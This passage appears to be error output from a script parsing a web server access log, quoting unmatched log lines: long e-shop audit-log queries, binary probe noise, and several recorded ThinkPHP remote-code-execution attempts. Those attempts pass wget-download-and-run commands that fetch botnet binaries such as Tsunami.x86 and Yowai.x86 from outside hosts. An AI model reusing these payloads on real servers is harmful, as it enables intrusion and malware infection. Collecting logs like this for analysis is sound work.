1069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [23/Jan/2019:11:22:38 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 112.28.77.213 - - [23/Jan/2019:11:24:26 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 122.196.231.141 - - [23/Jan/2019:11:39:38 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [23/Jan/2019:11:43:33 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.17.87 - - [23/Jan/2019:11:53:42 +0330] \"&\\xBEi\\x86p\\xBAOt}U\\x95\\xB3\\x5C\\x1F\\x02\\x1D\\x84\\xD7\\xAA{3]\\x1B\\x9BK\\xE2\\xEF\\xF79\\xBB\\xFD\\x05g\\xFB\\x1B\\xE5\\xFD1\\xCEJ\\xFB\\xD0\\xBE\\xF8/\\xBD_y\\xE0WX\\xF7,]\\xDC\\xBD\\xFE\\xE5\\xD5\\x7Fr\\xA5\\x9B\\xFB\\x97H[v\\x7F\\xF3\\xE2\\xEELa\\xCA:\\x10\\xEE\\xC5^K\\xE0\\xBF\\x09\\xE0Uy\\x1F\\x81[\\x5C\\x8C\\xF8\\xA3<\\x90\\xF8\\xAB\\x1F\\xD8\\xDF$\\xE0p\\x96\\xFF\\x00\\xDC\\x11\\xE4v3\\xD2\\x98\\xA8\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.17.87 - - [23/Jan/2019:11:55:26 +0330] \"E\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x039\\xDCt\\xBD\\xC3\\x84\\x0B\\xE6\\x12\\xF4\\xE2\\xE3\\x8DU\\x1D[\\xE0\\xCCT\\xAF\\xFF\\xE5\\xE1\\xF6\\x9C\\xD4\\x87\\xD3\\x9E\\xFA\\xAA\\x16 \\xEC\\x9E\\x15\\xAB~_j\\xA6\\x96:\\xED9\\xA59\\xE9[t\\xCF\\x86\\xAA\\x93\\x88K\\x85\\xD4FhU=b\\x88]\\x00\\x1E\\xC0+\\xC0/\\xCC\\xA9\\xCC\\xA8\\xC0,\\xC00\\xC0\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 58.186.25.218 - - [23/Jan/2019:11:56:52 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.66 - - [23/Jan/2019:12:07:16 +0330] \"\\x00\\x84\\x00\\x01\\x01\\x01\\x01\\x01\\x04\\xD2\\x00\\xA7\\x12\\xC2\\x10\\xC8D*\\xA3\\x17\\xE2\\xD9\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 213.41.230.66 - - [23/Jan/2019:12:37:02 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.85 - - [23/Jan/2019:12:43:24 +0330] \"\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\x8E\\x18\\xAD\\xC2\\xA6\\xAA\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.85 - - [23/Jan/2019:12:43:27 +0330] \"\\x00\\x00\\x00\\x03\\x16edge-stun.facebook.com\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.85 - - [23/Jan/2019:12:47:00 +0330] \"\\x05bE\\x00\\x05b\\x00\\x00@\\x00:\\x11\\xDC\\xCBJ}\\xA6\\x8A\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.118.241.13 - - [23/Jan/2019:13:18:21 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 37.29.32.137 - - [23/Jan/2019:13:18:53 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 117.198.103.116 - - [23/Jan/2019:13:25:05 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 89.46.222.181 - - [23/Jan/2019:13:27:55 +0330] \"GET public/index.php?s=/index/\\x5Cthink\\x5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://178.62.46.134/tom/Scorpion.x86;cat%20Scorpion.x86%20>%execute;chmod%20777%execute;./execute%20thinkphp\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 58.216.145.214 - - [23/Jan/2019:14:07:17 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 88.71.38.235 - - [23/Jan/2019:14:10:51 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 153.145.147.89 - - [23/Jan/2019:14:30:33 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 85.99.114.34 - - [23/Jan/2019:14:31:23 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 61.86.79.193 - - [23/Jan/2019:15:08:09 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 31.163.179.129 - - [23/Jan/2019:15:10:58 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.117.116.238 - - [23/Jan/2019:15:25:25 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:25538},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[51990]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20